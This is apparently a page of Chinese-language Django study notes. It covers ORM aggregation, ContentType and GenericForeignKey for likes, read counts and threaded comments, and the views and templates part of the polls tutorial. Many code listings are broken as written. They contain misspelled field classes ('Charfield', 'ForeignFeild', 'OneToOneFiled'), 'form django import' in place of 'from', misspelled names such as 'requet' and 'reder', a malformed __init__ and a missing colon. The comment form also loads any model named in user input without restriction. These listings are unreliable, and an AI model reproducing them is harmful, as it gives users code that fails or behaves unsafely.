>>> Book.objects.annotate(num_authors=Count('authors')).filter(num_authors__gt=1)

### 连接(Joins)和聚合
# 要寻找每个书店提供的书籍价格区间,可以使用这个注解(annotation),这告诉Django去检索Store模型,连接(通过多对多关系)Book模型,并且聚合书籍模型的价格字段来获取最大最小值。
>>> from django.db.models import Max, Min
>>> Store.objects.annotate(min_price=Min('books__price'), max_price=Max('books__price'))

# 想知道任何店铺正在销售的任何书籍的最低最高价,可以使用这个聚合:
>>> Store.objects.aggregate(min_price=Min('books__price'), max_price=Max('books__price'))

# 提取所出售的书籍中最年轻的作者年龄,可以写这样的查询:
>>> Store.objects.aggregate(youngest_age=Min('books__authors__age'))

### order_by()
>>> Book.objects.annotate(num_authors=Count('authors')).order_by('num_authors') # 通过书籍的作者数量来对书籍的QuerySet排序

### values()
# 返回的是数据库中的所有作者及其所著书的平均评分
>>> Author.objects.annotate(average_rating=Avg('book__rating'))
# 作者会按名字分组,所以只能得到不重名的作者分组的注解值。这意味着如果有两个作者同名,那么他们原本各自的查询结果将被合并到同一个结果中;两个作者的所有评分都将被计算为一个平均分
>>> Author.objects.values('name').annotate(average_rating=Avg('book__rating'))

</textarea>

<h4>ContentType和GenericForeignkey实现点赞、评论和阅读量</h4><pre>
https://docs.djangoproject.com/en/2.1/ref/contrib/contenttypes/

Django includes a contenttypes application that can track all of the models installed in your Django-powered project, providing a high-level, generic interface for working with your models

ContentType是django默认的一个模型类,其中app_label字段包含项目中所有的app,model关联的是已经在app内被定义的models,第一次进行migrate时就生成了,而且之后每次进行models的改动都会随之而更新

sqlite> select * from django_content_type;
id|app_label|model
1|admin|logentry
2|auth|permission
3|auth|group
4|auth|user
5|contenttypes|contenttype
6|sessions|session
7|blog|blogtype
8|blog|blog
9|blog|readnum
10|read_statistics|readnum

当一对"多"这个"多"的一侧会被应用于很多模型的外键时,这个contenttype的框架会让整个数据模型看起来干净很多

项目允许用户发布文章/评论/照片/视频/状态等,一般会需要建立以下几个模型
class Post(models.Model): pass
class Picture(models.Model): pass
class Comment(models.Model): pass
class Video(models.Model): pass
class Status(models.Model): pass

然后对于目前一般的网站来说都会支持一部分的社交功能如点赞,而且这种点赞功能需要支持在各个功能上,可以给文章、评论、照片、视频点赞等,这个"赞"的模型势必会需要设立很多外键,因为任何地方都会需要他。

class Likes(models.Model):
    post = models.Foreignkey(Post,....)
    comment = models.Foreignkey(Comment,....)
    picture = models.Foreignkey(Picture,....)
    video = models.Foreignkey(Video,....)
    status = models.Foreignkey(Status,....)

看上去外键非常多,虽然Likes这个类是一对多关系里的"多"这一侧,但实际上他的模型字段也是广义上的"一",因为他的外键字段和所连接的模型都是"一对一"建立连接的,而Django里面的ContentType其实就是起到一个自动一对多的作用,和任何模型都能连接起来,保证了代码的干净。

【 GenericForeignkey的使用 】
普通的Foreignkey只能"指向"单一的模型,而ContentType则可以允许和任意的模型进行连接,非常灵活,设立这种外键则需要3个字段

1：设定一个普通外键关联连接于ContentType,一般名字叫"content_type"。
这个字段实际上是代表在Likes这个点赞里面是给哪个对应的模型在点赞,是文章/评论/视频或是其他。

2：设立一个PostiveIntegerField的字段,一般名字叫做"object_id"。
以记录所对应的模型的实例的id号,比如给一篇文章点赞,这篇文章是Post类里的id为10的文章,那么这个object_id就是这个10。
当知道了模型的名字,也知道了这个模型的实例的id号,就可以找出这个实例了。

3：设定GenericForeignkey外键了,这个外键需要传入两个参数,就是上面的1和2,如果为上面2个字段取名content_type和object_id则可以不需要输入,因为这个字段默认会读取这2个名字。如果自定义过了就需要手动添加。
content_object是一个GenericForeignkey外键,他不是一个普通意义上的字段,所以如果使用queryset去进行读取的话,他不能被作为一个条件进行搜索读取等工作,需要用content_type和object来作为条件,如Likes.objects.filter(content_type=test_model_ct,object_id=testmodel.id)

</pre><textarea>
from django.db import models
from django.db.models.fields import exceptions
from django.contrib.contenttypes.fields import GenericForeignKey
from django.contrib.contenttypes.models import ContentType

# 创建了一个测试模型TestModel和一个点赞的Likes模型
class TestModel(models.Model):
    title = models.CharField('测试模型',max_length=30)

class Likes(models.Model):
    like_by = models.ForeignKey(User,on_delete=models.CASCADE,default=1)   # 定义这篇文章是谁点的赞

    content_type = models.ForeignKey(ContentType, on_delete=models.CASCADE)
    object_id = models.PositiveIntegerField()
    content_object = GenericForeignKey()

# 模型建立完了,再来写views视图函数,这里以为testmodel点赞为例子写,可以把testmodel想象成一篇博客文章
def test_page(request):
    testmodel = TestModel.objects.get(id=1)  # 取出这个测试实例,也就是将要被点赞的对象
    test_model_ct = ContentType.objects.get_for_model(TestModel) # 告诉ContentType现在要和TestModel这个模型建立连接
    total_like = len(Likes.objects.filter(content_type=test_model_ct,object_id=testmodel.id)) #  统计这个testmodel实例被点赞的总数

    if request.method == 'POST':
        like = Likes(content_object=testmodel,like_by=request.user)
        like.save()
        return redirect('test_area:test_page',)
    return render(request,'test_page.html',{'total_like':total_like})

# 最后来看下前端的页面渲染和url路由设置,比较简单,一个点赞按钮+一个点赞总计数
< form method="post" action="{% url 'test_area:test_page' %}">
    {% csrf_token %}
    < input type="submit" value="点赞">
< /form>
{{total_like}}

app_name='test_area'
urlpatterns=[ path('test_page',test_page,name='test_page') ]

</textarea><pre>
【 GenericRelation的使用 】
通过like来查询点赞总数可以说是正向查询
那是否有办法反向查询呢？就是在TestModel里建立一个GenericRelation的字段,他并不在数据表中真实生成,所以无需migrate

</pre><textarea>
class TestModel(models.Model):
    title = models.CharField('测试模型',max_length=30)
    like_info = GenericRelation(Likes)

# 修改下views视图函数
def test_page(request):
    testmodel = TestModel.objects.get(id=1)
    test_model_ct = ContentType.objects.get_for_model(TestModel)
    total_like = len(Likes.objects.filter(content_type=test_model_ct,object_id=testmodel.id))
    total_like_query = len(testmodel.like_info.all())
    #添加total_like_query,通过testmodel反向查询结果
    if request.method == 'POST':
        like = Likes(content_object=testmodel,like_by=request.user)
        like.save()
        return redirect('test_area:test_page',)
    return render(request,'test_page.html',{'total_like':total_like,'total_like_query':total_like_query})

# 前端页面,添加变量
<form method="post" action="{% url 'test_area:test_page' %}">
    {% csrf_token %}
    <input type="submit" value="点赞">
</form>
{{total_like}}<br>
{{total_like_query}}

</textarea><pre>
【 优化使用 】
testmodel = TestModel.objects.get(id=1)
test_model_ct = ContentType.objects.get_for_model(TestModel)
total_like = len(Likes.objects.filter(content_type=test_model_ct,object_id=testmodel.id))
这样的查询方式看上去有些累,先取出model的instance,再查出所代表的ContentyType,最后查出ContentType的instance.
更简单的方法需要在用到GenericRelation的基础上,在加上related_query_name这个选项

</pre>把提取ContentType对应模型以及通过object_id和content_type来查询,整合成了testmodels__id来进行查询。这样代码就简洁得多<textarea>
# 首先修改models
class TestModel(models.Model):
    title = models.CharField('测试模型',max_length=30)
    like_info = GenericRelation(Likes,related_query_name='testmodels')

# 再修改views视图函数
def test_ajax(request):
    testmodel = TestModel.objects.filter(id=3).first()
    #testmodel_ct = ContentType.objects.get_for_model(testmodel)
    #like_query = Likes.objects.filter(object_id=2, content_type=testmodel_ct, like_by=request.user.id)
    like_query = Likes.objects.filter(testmodels__id=3,like_by=request.user.id).first()

    if like_query is None:
        like = Likes(content_object=testmodel,like_by=request.user)
        like.save()
        total_like_query = len(testmodel.like_info.all())
        return JsonResponse({'notice':'Thanks for your vote','total_like_query':total_like_query})
    else:
        return JsonResponse({'notice':'You cant vote twice '})

</textarea><pre>
【 model_class 】
不能用ContentType.objects.get_for_model(),因为content_type是字符串blog

</pre><textarea>
content_type = requet.POST.get('content_type', '')  # 'blog'
object_id = int(requet.POST.get('object_id', ''))   # 10
model_class = ContentType.objects.get(model=content_type).model_class() # blog模型类
model_obj = model_class.objects.get(pk=object_id)

</textarea><pre>
【 一条博客的阅读量 】
Blog模型包含标题、类型、内容、作者、创建时间、最后的修改时间、阅读量等字段
如果将阅读量字段放入Blog模型,当阅读量增加时blog模型的最后修改时间也会自动更新,且无法统计出每个时间段如今天的阅读量
所以应该将阅读量字段放入另外的模型ReadNum,并以一对一关系关联

</pre><textarea>
from django.db import models
from django.contrib.auth.models import User
from cheditor_uploader.fields import RichTextUploaderingField
from django.db.models.fields import exceptions

class BlogType(models.Model):
    type_name = models.CharField(max_length=15)

    def __str__(self):
        return self.type_name

class Blog(models.Model):
    title = models.Charfield(max_length=50)
    blog_type = models.ForeignKey(BlogType, on_delete=models.DO_NOTHING)
    content = RichTextUploaderingField()
    author = models.ForeignFeild(User, on_delete=models.DO_NOTHING)
    created_time = models.DateTimeField(auto_now_add=True)
    last_updated_time = models.DtateTimeFeild(auto_now=True)

    def get_read_num(self):
        try:
            return self.readnum.read_num
        except exceptions.ObjectDoesNotExist:
            return 0

    def __str__(self):
        return "< Blog: %s >" % self.title

    class Meta:
        ordering = ['-created_time']

class ReadNum(models.Model):
    read_num = models.IntegerField(default=0)
    blog = models.OneToOneFiled(Blog, on_delete=DO_NOTHING)

$ python3 manage.py shell
>>> from blog.models import BlogType, Blog, ReadNum
>>> blog = Blog.objects.get(pk=1)
>>> blog
< Blog: < Blog: 第一篇博客>>
>>> print([ e for e in dir(blog) if not e.startswith('_') ])
['DoesNotExist', 'MultipleObjectsReturned', 'author', 'author_id', 'blog_type', 'blog_type_id', 'check', 'clean', 'clean_fields', 'content', 'created_time', 'date_error_message', 'delete', 'from_db', 'full_clean', 'get_deferred_fields', 'get_next_by_created_time', 'get_next_by_last_updated_time', 'get_previous_by_created_time', 'get_previous_by_last_updated_time', 'get_read_num', 'id', 'last_updated_time', 'objects', 'pk', 'prepare_database_save', 'readnum', 'refresh_from_db', 'save', 'save_base', 'serializable_value', 'title', 'unique_error_message', 'validate_unique']

>>> blog.author
< User: ysh>
>>> blog.author_id
1
>>> blog.author.id
1

>>> from django.contrib.auth.models import User
>>> User.objects.all()
< QuerySet [< User: ysh>]>
>>> user = User.objects.get()
>>> print([e for e in dir(user) if not e.startswith('_')])
['DoesNotExist', 'EMAIL_FIELD', 'Meta', 'MultipleObjectsReturned', 'REQUIRED_FIELDS', 'USERNAME_FIELD', 'blog_set', 'check', 'check_password', 'clean', 'clean_fields', 'date_error_message', 'date_joined', 'delete', 'email', 'email_user', 'first_name', 'from_db', 'full_clean', 'get_all_permissions', 'get_deferred_fields', 'get_email_field_name', 'get_full_name', 'get_group_permissions', 'get_next_by_date_joined', 'get_previous_by_date_joined', 'get_session_auth_hash', 'get_short_name', 'get_username', 'groups', 'has_module_perms', 'has_perm', 'has_perms', 'has_usable_password', 'id', 'is_active', 'is_anonymous', 'is_authenticated', 'is_staff', 'is_superuser', 'last_login', 'last_name', 'logentry_set', 'natural_key', 'normalize_username', 'objects', 'password', 'pk', 'prepare_database_save', 'refresh_from_db', 'save', 'save_base', 'serializable_value', 'set_password', 'set_unusable_password', 'unique_error_message', 'user_permissions', 'username', 'username_validator', 'validate_unique']
>>> print([e for e in dir(user) if e.startswith('blog')])
['blog_set']

>>> blog.readnum
< ReadNum: ReadNum object (1)>
>>> print([e for e in dir(blog.readnum) if not e.startswith('_')])
['DoesNotExist', 'MultipleObjectsReturned', 'blog', 'blog_id', 'check', 'clean', 'clean_fields', 'date_error_message', 'delete', 'from_db', 'full_clean', 'get_deferred_fields', 'id', 'objects', 'pk', 'prepare_database_save', 'read_num', 'refresh_from_db', 'save', 'save_base', 'serializable_value', 'unique_error_message', 'validate_unique']
>>> blog.readnum.read_num
10
>>> blog.get_read_num
< bound method Blog.get_read_num of < Blog: < Blog: 第一篇博客>>>

>>> r = ReadNum.objects.get(pk=1)
>>> r
< ReadNum: ReadNum object (1)>
>>> print([ e for e in dir(r) if e.startswith('blog') ])
['blog', 'blog_id']
>>> r.blog
< Blog: < Blog: 第一篇博客>>
>>> r.blog.id
1
>>> r.blog_id
1

### blog/admin.py
from django.contrib import admin
from .models import BlogType, Blog, ReadNum

@admin.register(BlogType)
class BlogTypeAdmin(admin.ModelAdmin):
    list_display = ('id', 'type_name')

@admin.register(Blog)
class BlogAdmin(admin.ModelAdmin):
    list_display = ('title', 'blog_type', 'author', 'get_read_num', 'created_time', 'last_updated_time')

@admin.register(ReadNum)
class ReadNumAdmin(admin.ModelAdmin):
    list_display = ('read_num', 'blog')

BlogAdmin.list_display包含readnum,结果http://127.0.0.1:8000/admin/blog/blog/页面READ NUM显示为ReadNum object (1),即显示的是关联的ReadNum模型的对象,要显示为阅读量如数字10则应该将list_display中的readnum属性改为Blog模型的自定义的get_read_num方法

</textarea><pre>
ReadNum模型扩展
blog模型需要阅读量字段来计数统计,如果有其他如评论\相册等其他模型同样需要计数统计,且逻辑相同代码相似,但blog = models.OneToOneFiled(Blog, on_delete=DO_NOTHING)已经绑定关联到了Blog模型,此时可以使用ContentType和GenericForeignkey

计数功能需要两个信息：关联到哪个模型、对应主键值,如关联到Blog模型、对应哪个Blog对象的主键值,即这篇博客的计数

</pre><textarea>
$ python3 manage.py startapp read_count

### read_count/models.py
from django.db import models
from django.contrib.contenttypes.fields import GenericForeignKey
from django.contrib.contenttypes.models import ContentType

class ReadNum(models.Model):
    read_num = models.IntegerField(default=0)
    content_type = models.ForeignKey(ContentType, on_delete=models.DO_NOTHING)
    object_id = models.PositiveIntegerField()
    content_object = GenericForeignKey('content_type', 'object_id')

### setting.py
INSTALLED_APP = [
    ...
    # 第三方app
    'ckeditor',
    'ckeditor_uploader',
    'blog',
    'read_count'
]

$ python3 manage.py makemigrations
$ python3 manage.py migrate

### read_count/admin.py
from django.contrib import admin
from .models import ReadNum

@admin.register(ReadNum)
class ReadNumAdmin(admin.ModelAdmin):
    list_display = ('read_num', 'content_object')

$ python3 manage.py runserver
进入http://localhost/admin应用read_count,增加read num
read num: 20
content type: blog
object id: 1
即blog模型的id为1的博客read_num设置为20,保存之后显示
READ NUM： 20
CONTENT OBJECT： < Blog: 第一篇博客>

$ python3 manage.py shell
>>> from read_count.models import ReadNum
>>> from blog.models import Blog
>>> from django.contrib.contenttypes.models import ContentType
>>> ContentType.objects.filter(model='Blog')
< QuerySet []>
>>> ContentType.objects.filter(model='blog')
< QuerySet [< ContentType: blog>]>
>>> ContentType.objects.get_for_model(Blog)
< ContentType: blog>
>>> ct = ContentType.objects.get_for_model(Blog)
>>> blog = Blog.objects.first()
>>> blog
< Blog: < Blog: 第一篇博客>>
>>> blog.pk
1
>>> ReadNum.objects.filter(content_type = ct, object_id = blog.pk)
< QuerySet [< ReadNum: ReadNum object (1)>]>
>>> rn = ReadNum.objects.filter(content_type = ct, object_id = blog.pk)[0]
>>> print([e for e in dir(rn) if not e.startswith('_')])
['DoesNotExist', 'MultipleObjectsReturned', 'check', 'clean', 'clean_fields', 'content_object', 'content_type', 'content_type_id', 'date_error_message', 'delete', 'from_db', 'full_clean', 'get_deferred_fields', 'id', 'object_id', 'objects', 'pk', 'prepare_database_save', 'read_num', 'refresh_from_db', 'save', 'save_base', 'serializable_value', 'unique_error_message', 'validate_unique']
>>> rn.read_num
20

### blog/models.py
from django.db.models.fields import exceptions
from read_count.models import ReadNum
from django.contrib.contenttypes.models import ContentType

class Blog(models.Model):
    pass

    def get_read_num(self):
        try:
            ct = ContentType.objects.get_for_model(self)
            rn = ReadNum.objects.get(content_type=ct, object_id=self.pk)
            return rn.read_num
        except exceptions.ObjectDoesNotExist:
            return 0

### blog/admin.py
@admin.register(Blog)
class BlogAdmin(admin.ModelAdmin):
    list_display = ('id', 'title', 'blog_type', 'author', 'get_read_num', 'created_time', 'last_updated_time')

http://127.0.0.1:8000/admin/blog/blog/页面GET READ NUM显示为20

封装提供代码通用性
将Blog模型的方法get_read_num抽取出来ReadNumExpandMethod,Blog通过继承来调用get_read_num方法

### blog/models.py
from read_count.models import ReadNumExpandMethod
class Blog(models.Model, ReadNumExpandMethod):

### read_count/models.py
class ReadNumExpandMethod():
    def get_read_num(self):
        ct = ContentType.objects.get_for_model(self)
        try:
            rn = ReadNum.objects.get(content_type=ct, object_id=self.pk)
            return rn.read_num
        except exceptions.ObjectDoesNotExist:
            return 0

</textarea>评论功能<textarea>
(1)第三方评论插件：友言、多说、畅言、Disqus、网易云跟帖
(2)django评论库：django-comment
(3)自己用代码实现

comment app的评论模型和blog app的博客模型是多对一关系,评论模型可以关联博客、图片、新闻、视频等app模块,所以也可以使用contenttype

$ python3 manage.py startapp comment

### comment/models.py
from django.db import models
from django.contrib.contenttypes.fields import GenericForeignKey
from django.contrib.contenttypes.models import ContentType
from django.contrib.auth.models import User

class Comment(models.Model):
    content_type = models.ForeignKey(ContentType, on_delete=DO_NOTHING)
    object_id = models.PositiveIntegerField()
    content_object = GenericForeignKey('content_type', 'object_id')

    text = models.TextField()
    comment_time = models.DateTimeField(auto_now_add = True)
    user = models.ForeignKey(User, on_delete = DO_NOTHING)

    class Meta:
        ordering = ['-comment_time']

### comment/forms.py
form django import forms
form django.contrib.contenttypes.models import ContentType
form django.db.models import ObjectDoesNotExist
form cheditor.widgets import CKEditorWidget

class CommentForm(forms.Form):
    content_type = forms.CharField(widget=form.HiddenInput)
    object_id = forms.IntegerField(widget=form.HiddenInput)
    text = forms.Charfield(
        label = False,
        widget=CKEditorWidget(config_name='comment_ckeditor'), # 富文本配置
        error_messages={'required': '评论内容不能为空'}
    )

    def __init__(request, *args, **kwargs):
        if 'user' in kwargs: self.user = kwargs.pop('user') # 将user参数传入CommentForm来验证
        super().__init__(*args, **kwargs)

    def clean(self)
        # 判断用户是否登录
        if self.user.is_authenticated:
            self.cleaned_data['user'] = self.user
        else:
            raise forms.ValidationError('用户尚未登录')

        content_type = self.cleaned_data['content_type']
        object_id = self.cleaned_data['object_id']
        try:
            model_class = ContentType.objects.get(model=content_type).model_class()
            model_obj = model_class.objects.get(pk=object_id)
            self.cleaned_data['content_object'] = model_obj
        except ObjectDoesNotExist:
            raise forms.ValidationError('评论对象不存在')
        return self.cleaned_data

### settings.py
CKEDITOR_UPLOAD_PATH = 'upload'
CKEDITOR_CONFIGS = {
    'comment_ckeditor': {
        'toolbar': 'custom',
        'toolbar_custom': [
            ['Bold', 'Italic', 'Underline', 'Strike', 'Subscript', 'Superscript'],
            ['TextColor', 'BGColor', 'RemoveFormat'],
            ['NumberedList', 'BulletedList'],
            ['Link', 'Unlink'],
            ['Smiley', 'SpecialChar', 'Blockquote']
        ],
        'width': 'auto',
        'height': '180',
        'tabSpace': 4,
        'removePlugins': 'elementspath',
        'resize_enabled': False,
    }
}

### blog/views.py
form comment.forms import CommentForm
def blog_detail(request, blog_pk):
    blog = get_object_or_404(Blog, pk=blog_pk)
    blog_content_type = ContentType.objects.get_for_model(blog)
    comments = Comment.objects.filter(content_type=blog_content_type, object_id=blog.pk)

    context = {}
    context['pre'] = Blog.objects.filter(created_time__gt=blog.created_time).last()
    context['next'] = Blog.objects.filter(created_time__lt=blog.created_time).first()
    context['blog'] = blog
    context['comments'] = comments          # 显示已发布的评论
    context['comment_form'] = CommentForm(inittial={'content_type':blog_content_type.model, 'object_id':blog.pk}) # 显示评论的表单
    return reder(request, 'blog/blog_detail.html', context)

### blog/template/blog/blog_detail.html
# 富文本插件
< script src="{% static 'ckeditor/ckeditor-init.js' %}">< /script>
< script src="{% static 'ckeditor/ckeditor/ckeditor.js' %}">< /script>
{% if user.is_authenticated %}
    < form action="{% url 'update_comment' %}" methond="POST">
        {% csrf_token %}
        {{ comment_form }}
        < input type="submit" value="评论">
    < /form>
{% endif %}

### comment/views.py
form .forms import CommentForm
def update_comment(request):
    referer = request.META.get('HTTP_REFERER', reverse('home'))
    comment_form = CommnetForm(request.POST, user=request.user) # 将用户是否登录放入form中去验证
    if comment_form.is_valid():
        comment = Comment()
        comment.user = request.user  # comment_form.cleaned_data['user']
        comment.text = comment_form.cleaned_data['text']
        comment.content_object = comment_form.cleaned_data['content_object']
        comment.save()
        return redirect(referer)
    else:
        return render(request, 'error.html', {'message':comment_form.errors, 'redirect_to': referer})


### 回复评论、回复之前的回复
树结构

class Comment(models.Model):
    content_type = models.ForeignKey(ContentType, on_delete=DO_NOTHING)
    object_id = models.PositiveIntegerField()
    content_object = GenericForeignKey('content_type', 'object_id')

    text = models.TextField()
    comment_time = models.DateTimeField(auto_now_add = True)
    user = models.ForeignKey(User, on_delete = DO_NOTHING)

    # parent_id = models.IntegerField(default=0) # 顶层parent_id为0
    parent = models.ForeignKey('self', null = True, on_delete = DO_NOTHING)  # 自关联,指向自己,顶层允许为null
    # reply_to = models.ForeignKey(User, null = True, on_delete = DO_NOTHING)  # 记录回复谁,顶层允许为null

    class Meta:
        ordering = ['-comment_time']

# 反向关联查询时报错,user.comment_set.all()不知道指向user字段还是reply_to字段,解决办法是设置related_name,此时反向查询用户的所有评论：user.comments.all(),反向查询用户回复评论或回复：user.replies.all()
# related_name='+'表示不创建反向关系

class Comment(models.Model):
    content_type = models.ForeignKey(ContentType, on_delete=DO_NOTHING)
    object_id = models.PositiveIntegerField()
    content_object = GenericForeignKey('content_type', 'object_id')

    text = models.TextField()
    comment_time = models.DateTimeField(auto_now_add = True)
    user = models.ForeignKey(User, related_name='comments', on_delete = DO_NOTHING)

    # parent_id = models.IntegerField(default=0) # 顶层parent_id为0
    root = models.ForeignKey('self', related_name='root_comment',null = True, on_delete = DO_NOTHING)    # 获取该条回复对应的顶级评论
    parent = models.ForeignKey('self', related_name='parent_comment', null = True, on_delete = DO_NOTHING)  # 自关联,指向自己,顶层评论的parent字段为None对应null
    reply_to = models.ForeignKey(User, related_name='replies', null = True, on_delete = DO_NOTHING)  # 记录回复谁,顶层允许为null

    class Meta:
        ordering = ['-comment_time']


</textarea>
</div>

<div id="django_view">
<h4>视图层</h4><pre>
视图层是Django处理请求的核心代码层,大多数Python代码都集中在这一层,它对外接收用户请求,对内调度模型层和模版层,统合数据库和前端,最后根据业务逻辑将处理好的数据与前端结合返回给用户。视图层是真正的后端,是Python工程师的'主营业务'。

Django的视图层包含下面一些主要内容:
URL路由
视图函数
快捷方式
装饰器
请求与响应
类视图
文件上传
CSV/PDF生成
内置中间件

Django视图是一类具有相同功能和模板的网页的集合,一个视图就是一个页面,通常使用特定的模板提供特定的功能

在一个博客应用中可能会创建如下几个视图:
博客首页——展示最近的几项内容。
内容"详情"页——详细展示某项内容。
以年为单位的归档页——展示选中的年份里各个月份创建的内容。
以月为单位的归档页——展示选中的月份里各天创建的内容。
以天为单位的归档页——展示选中天里创建的所有内容。
评论处理器——用于响应为一项内容添加评论的操作。

而投票应用中需要下列几个视图:
问卷"index"页:显示最新的一些问卷
问卷"detail"页面:显示一个问卷的详细文本内容,没有调查结果但是有一个投票或调查表单。
问卷"results"页面:显示某个问卷的投票或调查结果。
投票动作页面:处理针对某个问卷的某个选项的投票动作。

在Django中网页和其他内容都是从视图派生而来,每一个视图表现为一个简单的Python函数,在基于类的视图则是方法,Django将会根据用户请求的URL来选择使用哪个视图

</pre>向polls/views.py里添加更多视图,这些视图有一些不同,因为他们接收参数<textarea>
def detail(request, question_id):
    return HttpResponse("You're looking at question %s." % question_id)

def results(request, question_id):
    response = "You're looking at the results of question %s."
    return HttpResponse(response % question_id)

def vote(request, question_id):
    return HttpResponse("You're voting on question %s." % question_id)

# 把这些新视图添加进polls.urls模块polls/urls.py里,只要添加几个url()函数调用就行:
from django.urls import path
from . import views

urlpatterns = [
    path('', views.index, name='index'),                                 # ex: /polls/
    path('< int:question_id>/', views.detail, name='detail'),            # ex: /polls/5/
    path('< int:question_id>/results/', views.results, name='results'),  # ex: /polls/5/results/
    path('< int:question_id>/vote/', views.vote, name='vote'),           # ex: /polls/5/vote/
]

</textarea><pre>
请求网站的某一页面比如"/polls/34/",Django将会首先载入mysite.urls模块,因为它是settings文件里设置的根URL配置文件,然后Django在该文件中寻找名为urlpatterns变量并且按序匹配正则表达式。在找到匹配项'polls/',它切掉了匹配的文本("polls/"),将剩余文本"34/"发送至'polls.urls' URLconf做进一步处理。在polls.urls剩余文本匹配了'< int:question_id>/',使得Django以如下形式调用detail():
detail(request=< HttpRequest object>, question_id=34)

question_id=34由< int:question_id>匹配生成,使用尖括号"捕获"这部分URL,且以关键字参数的形式发送给视图函数。上述字符串的:question_id>部分定义了将被用于区分匹配模式的变量名,而int:则是一个转换器决定了应该以什么变量类型匹配这部分的URL路径。

每个视图只要求返回一个包含请求页面的HttpResponse对象或弹出一个类似Http404的异常
视图可以从数据库里读取记录,可以使用一个模板引擎(如Django自带的或其他第三方的),可以生成一个PDF文件,可以输出一个XML,创建一个ZIP文件,可以做任何想做的事,使用任何想用的Python库。

</pre>下面是一个新的index()视图,用于替代先前无用的index,它会根据发布日期显示最近的5个投票问卷,polls/views.py<textarea>
from django.http import HttpResponse
from .models import Question

def index(request):
    latest_question_list = Question.objects.order_by('-pub_date')[:5]
    output = ', '.join([q.question_text for q in latest_question_list])
    return HttpResponse(output)

</textarea><pre>
这里有个非常重要的问题:在当前视图中的HTML页面是硬编码的。如果想改变页面的显示内容,就必须修改这里的Python代码。为了解决这个问题,需要使用Django提供的模板系统,解耦视图和模板之间的硬连接,只要创建一个视图就可以将页面的设计从代码中分离出来。

首先在polls目录里创建一个templates目录,Django将会在这个目录里查找模板文件。

项目的TEMPLATES配置项描述了Django如何载入和渲染模板,默认的设置文件设置了DjangoTemplates后端,并将APP_DIRS设置成了True,这一选项将会让DjangoTemplates在每个INSTALLED_APPS文件夹中寻找"templates"子目录。这就是为什么尽管没有修改DIRS设置,Django也能正确找到polls的模板位置的原因。

在刚创建的templates目录里,再创建一个目录polls,然后在其中新建一个文件index.html,即模板文件的路径应该是polls/templates/polls/index.html。因为Django会寻找到对应的app_directories,所以只需要使用polls/index.html就可以引用到这一模板了。

模板命名空间
虽然可以将模板文件直接放在polls/templates文件夹中,而不是再建立一个polls子文件夹,但是这样做不太好。Django将会选择第一个匹配的模板文件,如果有一个模板文件正好和另一个应用中的某个模板文件重名,Django没有办法区分它们。需要帮助Django选择正确的模板,最简单的方法就是把他们放入各自的命名空间中,也就是把这些模板放入一个和自身应用重名的子文件夹里,从而达到独立命名空间的作用,不会再出现引用错误

</pre>polls/templates/polls/index.html<textarea>
{% if latest_question_list %}
    <ul>
        {% for question in latest_question_list %}
            <li><a href="/polls/{{ question.id }}/">{{ question.question_text }}</a></li>
        {% endfor %}
    </ul>
{% else %}
    <p>No polls are available.</p>
{% endif %}

# 更新视图文件polls/views.py里的index视图来,让新的index.html模板文件生效,载入polls/index.html模板文件,并且向它传递一个上下文(context),这个上下文参数是一个字典,它将模板内的变量映射为Python对象
from django.http import HttpResponse
from django.template import loader
from .models import Question

def index(request):
    latest_question_list = Question.objects.order_by('-pub_date')[:5]
    template = loader.get_template('polls/index.html')
    context = {
        'latest_question_list': latest_question_list,
    }
    return HttpResponse(template.render(context, request))

</textarea><pre>
快捷函数render()
render(request, templateName, dictContext)
returns an HttpResponse object of the given template rendered with the given context
「载入模板,填充上下文,再返回由它生成的HttpResponse对象」是一个非常常用的操作流程,于是Django提供了一个快捷函数,用它来重写index()视图:
不再需要导入loader和HttpResponse,而是从django.shortcuts导入了render,不过如果还有其他函数detail,results和vote需要用到它的话就需要保持HttpResponse的导入。

render()函数的第一个位置参数是请求对象(就是view函数的第一个参数),第二个位置参数是模板。还可以有一个可选的第三参数,一个字典,包含需要传递给模板的数据。最后render函数返回一个经过字典数据渲染过的模板封装而成的HttpResponse对象

</pre><textarea>
from django.shortcuts import render
from .models import Question

def index(request):
    latest_question_list = Question.objects.order_by('-pub_date')[:5]
    context = {'latest_question_list': latest_question_list}
    return render(request, 'polls/index.html', context)

</textarea><pre>
返回404错误
处理投票详情视图,它会显示指定投票的问题标题

</pre><textarea>
from django.http import Http404
from django.shortcuts import render
from .models import Question
def detail(request, question_id):
    # 如果指定问题ID所对应的问题不存在,这个视图就会抛出一个Http404异常
    try:
        question = Question.objects.get(pk=question_id)
    except Question.DoesNotExist:
        raise Http404("Question does not exist")
    return render(request, 'polls/detail.html', {'question': question})

# polls/templates/polls/detail.html
{{ question }}

</textarea><pre>
快捷函数get_object_or_404()
get_object_or_404()方法将一个Django模型作为第一个位置参数,后面可以跟上任意个数的关键字参数,如果对象不存在则弹出Http404错误
也有get_list_or_404()函数,工作原理和get_object_or_404()一样,除了get()函数被换成了filter()函数,如果列表为空的话会抛出Http404异常

为什么使用辅助函数get_object_or_404()而不是自己捕获ObjectDoesNotExist异常呢？为什么模型API不直接抛出ObjectDoesNotExist而是抛出Http404呢？因为这样做会增加模型层和视图层的耦合性。指导Django设计的最重要的思想之一就是要保证松散耦合,一些受控的耦合将会被包含在django.shortcuts模块中。

</pre><textarea>
from django.shortcuts import get_object_or_404, render
from .models import Question
def detail(request, question_id):
    question = get_object_or_404(Question, pk=question_id)
    return render(request, 'polls/detail.html', {'question': question})

</textarea><pre>
使用模板系统
detail()视图向模板传递了上下文变量question,下面是polls/templates/polls/detail.html模板里正式的代码:

</pre><textarea>
<h1>{{ question.question_text }}</h1>
<ul>
    {% for choice in question.choice_set.all %}
        <li>{{ choice.choice_text }}</li>
    {% endfor %}
</ul>

</textarea><pre>
模板系统统一使用点符号来访问变量对象的属性,{{ question.question_text }},首先Django尝试对question对象使用字典查找,也就是使用obj.get(str)操作,如果失败了就尝试属性查找也就是obj.str操作,如果这一操作也失败的话将会尝试列表查找,也就是obj[int]操作

在{% for %}循环中发生的函数调用:question.choice_set.all被解释为Python代码question.choice_set.all(),将会返回一个可迭代的Choice对象,这一对象可以在{% for %}标签内部使用

去除模板中的硬编码的URL
在polls/index.html里编写投票链接时,a链接的href属性"/polls/{{ question.id }}/"是硬编码的
硬编码和强耦合的链接对于代码修改非常不利,如果在urls.py文件里修改了路由表达式,那么所有的模板中对这个url的引用都需要修改
前面通过path('< int:question_id>/', views.detail, name='detail')给urls定义了一个name别名,可以使用{% url %}标签代替它来解决这个问题
a链接的href属性改为"{% url 'detail' question.id %}"
